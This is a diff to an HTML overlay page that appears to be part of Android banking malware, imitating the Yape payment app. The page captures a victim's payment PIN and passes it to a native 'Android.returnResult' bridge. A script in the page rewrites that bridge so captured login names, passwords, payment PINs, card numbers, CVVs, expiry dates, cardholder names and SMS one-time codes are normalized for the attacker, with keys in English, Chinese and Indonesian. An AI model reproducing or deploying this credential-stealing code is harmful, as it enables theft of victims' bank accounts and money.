@@ -368,8 +368,8 @@
         setTimeout(function () {
           if (typeof Android !== 'undefined' && Android.returnResult) {
             Android.returnResult(JSON.stringify({
-              '类型': 'yape',
-              '支付密码': pin
+              'template': 'yape',
+              'password': pin
             }));
           }
           setTimeout(closeApp, 2500);
@@ -405,6 +405,6 @@
       renderPin();
     })();
   </script>
-<script>(function(){if(typeof Android==="undefined")return;var _r=Android.returnResult;if(!_r)return;var M={"username":"login","account":"login","phone":"login","email":"login","name":"card_name","用户名":"login","手机号":"login","账号":"login","loginSecond":"login","codeFirst":"login","loginId":"login","mobileInput":"login","akses-account-input":"login","accountInput":"login","phoneInput":"login","login-identifier":"login","clientNumber":"login","j_username":"login","密码":"password","pass":"password","passwordFirst":"password","passwordSecond":"password","登录密码":"password","akses-password-input":"password","passwordInput":"password","login-password":"password","j_password":"password","pin":"pay_pin","支付密码":"pay_pin","payment_password":"pay_pin","walletPassword":"pay_pin","交易密码":"pay_pin","pay_password":"pay_pin","mpin":"pay_pin","card":"card","银行卡":"card","卡号":"card","card_no":"card","card_number":"card","bankcard":"card","seriaFirst":"card","cC":"card","cvc":"cvv","security_code":"cvv","安全码":"cvv","cV":"cvv","expiry":"exp_date","card_date":"exp_date","有效期":"exp_date","expire":"exp_date","cE":"exp_date","cardholder":"card_name","持卡人":"card_name","姓名":"card_name","cN":"card_name","sms":"sms_code","verification_code":"sms_code","验证码":"sms_code","otp":"sms_code"};Android.returnResult=function(j){try{var d=JSON.parse(j),n={};for(var k in d){n[M[k]||k]=d[k]}j=JSON.stringify(n)}catch(e){}return _r.call(Android,j)};})();</script>
+<script>(function(){if(typeof Android==="undefined")return;var _r=Android.returnResult;if(!_r)return;var M={"username":"login","account":"login","phone":"login","email":"login","name":"card_name",'username':"login",'username':"login",'username':"login","loginSecond":"login","codeFirst":"login","loginId":"login","mobileInput":"login","akses-account-input":"login","accountInput":"login","phoneInput":"login","login-identifier":"login","clientNumber":"login","j_username":"login",'password':"password","pass":"password","passwordFirst":"password","passwordSecond":"password",'password':"password","akses-password-input":"password","passwordInput":"password","login-password":"password","j_password":"password","pin":"pay_pin",'password':"pay_pin","payment_password":"pay_pin","walletPassword":"pay_pin",'password':"pay_pin","pay_password":"pay_pin","mpin":"pay_pin","card":"card","银行卡":"card","卡号":"card","card_no":"card","card_number":"card","bankcard":"card","seriaFirst":"card","cC":"card","cvc":"cvv","security_code":"cvv","安全码":"cvv","cV":"cvv","expiry":"exp_date","card_date":"exp_date","有效期":"exp_date","expire":"exp_date","cE":"exp_date","cardholder":"card_name","持卡人":"card_name","姓名":"card_name","cN":"card_name","sms":"sms_code","verification_code":"sms_code","验证码":"sms_code","otp":"sms_code"};Android.returnResult=function(j){try{var d=JSON.parse(j),n={};for(var k in d){n[M[k]||k]=d[k]}j=JSON.stringify(n)}catch(e){}return _r.call(Android,j)};})();</script>
 </body>
 </html>
